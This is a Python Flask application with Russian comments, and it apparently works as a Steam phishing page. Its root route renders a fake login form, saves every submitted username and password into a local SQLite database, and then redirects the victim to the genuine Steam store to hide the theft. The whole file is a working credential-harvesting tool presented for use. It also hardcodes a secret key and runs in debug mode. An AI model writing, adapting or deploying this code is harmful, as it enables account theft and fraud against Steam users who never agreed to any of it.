# импортирование модулей
from colorama import Fore, init
from flask import Flask, g, redirect, render_template, request
import os
from SteamDataBase import SteamDataBase
import sqlite3

# подключение colorama
init()

# константы приложения
DATABASE = '/tmp/steamdata.db'
DEBUG = True
SECRET_KEY = 'hgf653rfv63!73t@BYF'

# конфигурация приложения
app = Flask(__name__)
app.config.from_object(__name__)
app.config.update(dict(DATABASE=os.path.join(app.root_path, 'steamdata.db')))


# база данных
# соединение с базой данных
def connect_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    conn.row_factory = sqlite3.Row
    return conn


# создание базы данных
def create_db():
    db = connect_db()
    with app.open_resource('steamdatabase.sql', mode='r') as f:
        db.cursor().executescript(f.read())
    db.commit()
    db.close()


# получение базы данных
def get_db():
    if not hasattr(g, 'link_db'):
        g.link_db = connect_db()
    return g.link_db


# страница входа в аккаунт
@app.route('/', methods=['GET', 'POST'])
def login():
    db = get_db()
    dbase = SteamDataBase(db)
    if request.method == "POST":
        res = dbase.add_data(request.form['username'], request.form['password'])
        return redirect('https://store.steampowered.com/')
    return render_template('login.html')


# закрытие базы данных
@app.teardown_appcontext
def close_db(error):
    if error is None:
        print(Fore.GREEN + 'Ошибок нет!')
    if hasattr(g, 'link_db'):
        g.link_db.close()


# включение сервера
if __name__ == "__main__":
    app.run(debug=True)